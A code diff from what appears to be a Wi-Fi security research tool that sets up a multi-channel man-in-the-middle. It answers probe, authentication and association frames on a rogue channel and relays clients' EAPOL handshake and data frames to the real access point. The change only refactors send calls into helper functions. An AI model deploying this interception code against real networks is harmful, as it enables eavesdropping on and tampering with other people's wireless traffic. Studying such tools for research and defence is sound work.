@@ -24,7 +24,7 @@ bool McMitm::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) const{
             resp.auth_seq_number(2);
             resp.auth_algorithm(0);   // Open System
             resp.status_code(0);      // Success
-            sock_rogue->send(resp, netconfig.rogue_channel);
+            send_to_rogue(resp);
             log(LogLevel::DEBUG, "Rogue channel: sent Open Auth response to {}", addr2.to_string());
             return true;
         }
@@ -54,9 +54,9 @@ bool McMitm::handle_assoc_request(const HWAddress<6> &addr2, PDU &pdu, Dot11 &do
             static_cast<Dot11ManagementFrame::rates_type::value_type>(96),  // 48 Mbps
         };
         resp.supported_rates(rates);
-        sock_rogue->send(resp, netconfig.rogue_channel);
+        send_to_rogue(resp);
         log(LogLevel::DEBUG, "Rogue channel: sent Assoc response to {}", addr2.to_string());
-        sock_real->send(pdu, netconfig.real_channel);
+        send_to_real(pdu);
         return true;
     }
     return false;
@@ -66,7 +66,7 @@ bool McMitm::handle_probe(const HWAddress<6> addr2, const PDU *pdu, const Dot11 
     if(dot11.find_pdu<Dot11ProbeRequest>()){
         if(ap_mac != dot11.addr1()) return true;
         probe_resp->addr1(addr2);
-        sock_rogue->send(*probe_resp, netconfig.rogue_channel);
+        send_to_rogue(*probe_resp);
         display_client_traffic(*pdu, "Rogue channel", " -- Replied");
         return true;
     }
@@ -82,7 +82,7 @@ bool McMitm::handle_action_rogue(const HWAddress<6> addr2, PDU &pdu, const Dot11
 
     if(addr2 == client_mac || clients.contains(addr2)){
         log(LogLevel::DEBUG, "Rogue channel: Action from client -> real channel");
-        sock_real->send(pdu, netconfig.real_channel);
+        send_to_real(pdu);
         return true;
     }
     return false;
@@ -109,7 +109,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
         if(is_eapol(*pdu) && clients.contains(addr2)){
             int eapol_msg = get_eapol_msg_num(*pdu);
             log(LogLevel::INFO, "Rogue channel: EAPOL {} from STA ->  real channel", eapol_msg);
-            if(eapol_msg == 2 || eapol_msg == 4) sock_real->send(*pdu, netconfig.real_channel);
+            if(eapol_msg == 2 || eapol_msg == 4) send_to_real(*pdu);
             if(eapol_msg == 4 && only_to_mitm) stop_mitm = true;
             return;
         }
@@ -162,7 +162,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
                 log(LogLevel::WARNING, "Client {} is going to sleep on rogue channel. Removing sleep bit.", addr2);
                 //dot11->power_mgmt(0);
             }
-            sock_real->send(*pdu, netconfig.real_channel);
+            send_to_real(*pdu);
         }
     } else if(dot11->addr1() == client_mac || addr2 == client_mac){
         display_client_traffic(*pdu, "Rogue channel", "_");
